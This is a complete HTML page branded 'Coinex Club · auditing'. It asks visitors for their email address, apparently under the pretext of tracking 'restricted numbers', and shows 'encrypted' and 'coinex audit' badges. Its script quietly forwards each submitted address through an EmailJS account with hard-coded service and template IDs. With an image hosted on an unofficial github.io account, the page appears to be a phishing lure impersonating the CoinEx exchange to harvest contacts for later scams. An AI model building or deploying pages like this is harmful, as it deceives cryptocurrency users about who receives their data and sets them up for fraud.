<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coinex Club · auditing</title>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    /* reset & base */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    body {
      min-height: 100vh;
      background: #0b1a1f;
      background-image: url('https://coinexsup.github.io/Pic/agsgfd.png');
      background-repeat: no-repeat;
      background-position: center center;
      background-size: 500% 500%;  /* خیلی خیلی دور — عکس کامل دیده میشه */
      background-attachment: fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      margin: 0;
    }

    /* glass card — white matte glass, green-cyan border, no gray */
    .glass-card {
      width: 100%;
      max-width: 480px;
      padding: 44px 32px 40px;
      background: rgba(255, 255, 255, 0.40);
      backdrop-filter: blur(18px) saturate(200%);
      -webkit-backdrop-filter: blur(18px) saturate(200%);
      border-radius: 56px;
      border: 2px solid rgba(0, 255, 200, 0.6);
      box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.4),
                  inset 0 0 0 1px rgba(255, 255, 255, 0.25);
      transition: all 0.2s ease;
      color: #11161e;
      text-align: center;
      background: rgba(255, 255, 255, 0.35);
    }

    /* all text dark, no gray */
    .club-title {
      font-size: 2.2rem;
      font-weight: 550;
      letter-spacing: -0.5px;
      color: #0a1a1a;
      text-shadow: 0 2px 8px rgba(255, 255, 255, 0.3);
      margin-bottom: 6px;
    }
    .club-title span {
      font-weight: 300;
      color: #0a2626;
    }

    .sub-audit {
      font-size: 0.95rem;
      font-weight: 400;
      letter-spacing: 1px;
      color: #0e2626;
      border-bottom: 1px solid rgba(0, 200, 180, 0.3);
      padding-bottom: 16px;
      margin-bottom: 26px;
      display: inline-block;
      text-transform: uppercase;
      background: rgba(255,255,255,0.15);
      padding: 6px 24px;
      border-radius: 60px;
      backdrop-filter: blur(2px);
    }

    .audit-hint {
      background: rgba(255, 255, 255, 0.30);
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
      border-radius: 60px;
      padding: 12px 22px;
      margin-bottom: 32px;
      font-size: 0.95rem;
      font-weight: 420;
      color: #0f1e1e;
      border: 1px solid rgba(0, 200, 180, 0.25);
      display: inline-block;
      letter-spacing: 0.2px;
      line-height: 1.5;
    }
    .audit-hint strong {
      font-weight: 600;
      color: #004d44;
    }

    .input-group {
      width: 100%;
      margin-bottom: 28px;
    }

    .input-group label {
      display: block;
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: #1a2f2f;
      font-weight: 550;
      margin-bottom: 8px;
      text-align: left;
      padding-left: 6px;
    }

    .glass-input {
      width: 100%;
      padding: 18px 24px;
      font-size: 1.1rem;
      background: rgba(255, 255, 255, 0.45);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      border: 1.5px solid rgba(0, 200, 180, 0.5);
      border-radius: 60px;
      color: #0a1a1a;
      outline: none;
      transition: 0.2s;
      font-weight: 450;
      letter-spacing: 0.3px;
      box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.03);
    }

    .glass-input::placeholder {
      color: #2a4040;
      font-weight: 350;
      opacity: 0.7;
    }

    .glass-input:focus {
      border-color: #00c4b0;
      background: rgba(255, 255, 255, 0.65);
      box-shadow: 0 0 0 3px rgba(0, 200, 180, 0.15), inset 0 2px 8px rgba(0,0,0,0.02);
    }

    .confirm-btn {
      width: 100%;
      padding: 18px 24px;
      border: 1.5px solid #00b8a0;
      background: rgba(255, 255, 255, 0.35);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 80px;
      color: #0a1a1a;
      font-size: 1.3rem;
      font-weight: 500;
      letter-spacing: 0.5px;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 8px 24px -8px rgba(0, 30, 25, 0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      text-shadow: 0 1px 4px rgba(255,255,255,0.2);
    }

    .confirm-btn:hover {
      background: rgba(255, 255, 255, 0.55);
      border-color: #00d4c0;
      transform: scale(1.01);
      box-shadow: 0 12px 32px -10px #00b8a060;
    }

    .confirm-btn:active {
      transform: scale(0.97);
    }

    .confirm-btn:disabled {
      opacity: 0.5;
      pointer-events: none;
      filter: grayscale(0.3);
      border-color: #4a8a7a;
    }

    .status-badge {
      display: inline-block;
      margin-top: 18px;
      font-size: 0.85rem;
      background: rgba(255, 255, 255, 0.30);
      backdrop-filter: blur(4px);
      padding: 8px 26px;
      border-radius: 60px;
      border: 1px solid rgba(0, 200, 180, 0.15);
      color: #0a1e1e;
      min-height: 40px;
      transition: 0.15s;
      font-weight: 450;
    }

    .status-badge.error {
      background: rgba(200, 80, 60, 0.18);
      border-color: #cc6a5a;
      color: #4a1a1a;
    }
    .status-badge.success {
      background: rgba(0, 200, 150, 0.18);
      border-color: #00b89a;
      color: #003d33;
    }

    .spinner {
      display: inline-block;
      width: 22px;
      height: 22px;
      border: 2px solid rgba(0, 0, 0, 0.1);
      border-top: 2px solid #00665a;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .footnote {
      margin-top: 28px;
      font-size: 0.7rem;
      color: #1a3636;
      letter-spacing: 1px;
      border-top: 1px solid rgba(0, 200, 180, 0.15);
      padding-top: 22px;
      display: flex;
      justify-content: center;
      gap: 28px;
      flex-wrap: wrap;
      font-weight: 450;
    }
    .footnote span {
      opacity: 0.8;
    }

    @media (max-width: 480px) {
      .glass-card { padding: 32px 20px; }
      .club-title { font-size: 1.8rem; }
    }
  </style>
</head>
<body>
  <div class="glass-card" id="appCard">
    <div class="club-title">Coinex <span>Club</span></div>
    <div class="sub-audit">🔍 auditing · limited phone</div>

    <div class="audit-hint">
      <strong>⏳</strong> enter your email to track restricted numbers
    </div>

    <div class="input-group">
      <label for="emailInput">📧 email address</label>
      <input type="email" id="emailInput" class="glass-input" placeholder="you@example.com" autocomplete="email" spellcheck="false">
    </div>

    <button class="confirm-btn" id="confirmBtn">
      <span>✓</span> confirm
    </button>

    <div id="statusMessage" class="status-badge">ready</div>

    <div class="footnote">
      <span>🔐 encrypted</span>
      <span>🛡️ coinex audit</span>
    </div>
  </div>

  <script>
    (function() {
      emailjs.init("PakuuN4ADUDEqrzHl");

      const emailInput = document.getElementById('emailInput');
      const confirmBtn = document.getElementById('confirmBtn');
      const statusDiv = document.getElementById('statusMessage');

      function setStatus(text, type = '') {
        statusDiv.textContent = text;
        statusDiv.className = 'status-badge' + (type ? ' ' + type : '');
      }

      emailInput.addEventListener('input', function() {
        if (statusDiv.classList.contains('error') || statusDiv.classList.contains('success')) {
          setStatus('✏️ enter email', '');
        }
      });

      async function handleConfirm() {
        const email = emailInput.value.trim();

        if (!email || !email.includes('@') || !email.includes('.')) {
          setStatus('⚠️ please enter a valid email', 'error');
          return;
        }

        confirmBtn.disabled = true;
        const originalBtnHTML = confirmBtn.innerHTML;
        confirmBtn.innerHTML = `<span class="spinner"></span> sending`;

        setStatus('⏳ sending audit request...', '');

        try {
          const templateParams = {
            email: email,
            to_name: 'Coinex Audit',
            from_name: 'Coinex Club',
            message: `Audit request from Coinex Club.\nEmail: ${email}\nLimited phone numbers tracking.`,
          };

          const response = await emailjs.send(
            "service_j8bd9vn",
            "template_paduqpn",
            templateParams
          );

          console.log('✅ email sent', response);
          setStatus('✅ request sent — you will be notified', 'success');
          emailInput.value = '';
        } catch (error) {
          console.warn('❌ email send error:', error);
          setStatus('⚠️ submission failed, try again', 'error');
        } finally {
          confirmBtn.disabled = false;
          confirmBtn.innerHTML = originalBtnHTML;
        }
      }

      confirmBtn.addEventListener('click', handleConfirm);

      emailInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          if (!confirmBtn.disabled) {
            handleConfirm();
          }
        }
      });

      setStatus('📬 enter your email', '');
    })();
  </script>
</body>
</html>
